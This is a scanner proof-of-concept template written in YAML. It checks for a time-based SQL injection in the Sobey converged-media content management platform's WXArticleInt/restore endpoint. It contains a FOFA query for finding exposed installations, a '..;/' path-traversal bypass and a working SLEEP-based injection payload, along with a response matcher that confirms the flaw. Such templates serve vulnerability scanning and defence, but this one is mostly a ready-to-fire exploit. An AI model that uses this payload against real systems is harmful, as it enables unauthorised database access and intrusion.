id: poc-yaml-sobey-imcmp-wxarticleint-restore-sqli
info:
  name: 索贝融合媒体内容管理平台 WXArticleInt_restore SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 索贝融合媒体内容管理平台
  fofa: body="/Sc-TaskMonitoring/" || header="Sobey"
variables:
  t1: random_int(4,9)
  t2: t1 + 2
requests:
- method: POST
  path: /sobey-mchEditor/js/..;/mch/WXArticleInt/restore
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: siteCode=&token=&id=1 AND (SELECT * FROM (SELECT(SLEEP({{.t1}})))x)
  expression: status_code == 200 && contains(body,"\"data\":") && contains(body,"\"status\":400")
    && contains(body,"组稿还原异常") && !contains(body,"<") && duration > t1 && duration
    < t2
transport: http
